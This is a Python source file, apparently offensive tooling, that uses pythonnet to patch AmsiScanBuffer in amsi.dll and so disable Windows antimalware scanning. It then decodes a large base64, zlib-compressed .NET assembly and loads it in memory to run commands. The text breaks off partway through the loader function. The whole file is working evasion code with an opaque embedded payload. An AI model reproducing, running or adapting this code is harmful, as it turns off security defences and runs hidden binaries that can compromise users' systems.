import base64
import zlib
import argparse
import clr
import ctypes
from ctypes import *
import System
from System import Array, IntPtr, UInt32
from System.Reflection import Assembly
import System.Reflection as Reflection

# Ensure necessary .NET references are added
clr.AddReference("System.Management.Automation")

from System.Management.Automation import Runspaces, RunspaceInvoke
from System.Runtime.InteropServices import Marshal

base64_str = "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"


def bypass():
    """
    Bypasses the Antimalware Scan Interface (AMSI) by patching the AmsiScanBuffer method in amsi.dll.
    This allows scripts to run without being scanned and potentially blocked by AMSI.
    """
    windll.LoadLibrary("amsi.dll")
    windll.kernel32.GetModuleHandleW.argtypes = [c_wchar_p]
    windll.kernel32.GetModuleHandleW.restype = c_void_p
    handle = windll.kernel32.GetModuleHandleW('amsi.dll')
    windll.kernel32.GetProcAddress.argtypes = [c_void_p, c_char_p]
    windll.kernel32.GetProcAddress.restype = c_void_p
    BufferAddress = windll.kernel32.GetProcAddress(handle, "AmsiScanBuffer")
    BufferAddress = IntPtr(BufferAddress)
    Size = System.UInt32(0x05)
    ProtectFlag = System.UInt32(0x40)
    OldProtectFlag = Marshal.AllocHGlobal(0)
    virt_prot = windll.kernel32.VirtualProtect(BufferAddress, Size, ProtectFlag, OldProtectFlag)
    patch = System.Array[System.Byte]((System.UInt32(0xB8), System.UInt32(0x57), System.UInt32(0x00), System.UInt32(0x07), System.UInt32(0x80), System.UInt32(0xC3)))
    Marshal.Copy(patch, 0, BufferAddress, 6)

def base64_to_bytes(base64_string):
    """
    Converts a base64 encoded string to a .NET byte array after decompressing it.
    Args:
        base64_string: The base64 encoded and compressed string to convert.
    Returns:
        A .NET byte array of the decompressed data.
    """
    # Decode the base64 string to get the compressed binary data
    compressed_data = base64.b64decode(base64_string)
    # Decompress the data
    decompressed_data = zlib.decompress(compressed_data)
    # Convert the decompressed binary data to a .NET byte array
    return System.Array[System.Byte](decompressed_data)

def load_and_execute_assembly(command):
    """
    Loads a .NET assembly from a base64 encoded and compressed string, and executes a specified method.
    Args:
        command: The command to execute within the loaded assembly.
    Returns:
        The result of the executed command.
    """
    
    assembly_bytes = base64_to_bytes(base64_str)
    
    # Load the assembly
